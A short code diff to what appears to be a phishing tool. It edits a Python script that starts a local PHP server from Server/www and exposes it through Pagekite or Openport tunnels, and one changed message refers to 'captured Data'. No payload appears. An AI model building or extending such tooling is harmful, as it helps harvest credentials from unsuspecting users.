@@ -261,7 +261,7 @@ def runPagekite(port):
 			print("\n{0}[{1}*{0}] {1}Sometime Email verification Required by Pagekite(Stay Alert){1}".format(MAIN0, MAIN4))
 			print("\n{0}[{1}*{0}] {1}You can also get various subdomain assigned to your subdomain.{1}".format(MAIN0, MAIN4))
 			print("\n{0}[{1}*{0}] {1}Check Control Panel Of pagekite at https://pagekite.net/ .{1}".format(MAIN0, MAIN4))
-			print("\n{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.{1}".format(MAIN0, MAIN4))
+			print("\n{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.Press CTRL+C Whenever Need captured Data.{1}".format(MAIN0, MAIN4))
 			input("\n\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(MAIN0, MAIN4))
 			system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
 			system("cd Server/www/ && php -S localhost:%s > /dev/null 2>&1 &" % (port))
@@ -283,7 +283,7 @@ def runOpenport(port):
 		print('[*] Openport not Installed correctly, Try installing it manually !!')
 		print('[*] Check Here ... https://openport.io/download')
 		input('\n Press Enter To Go back..')
-		selectServer()
+		selectServer(port)
 	else:
 		manageOpenporturl(port)
 
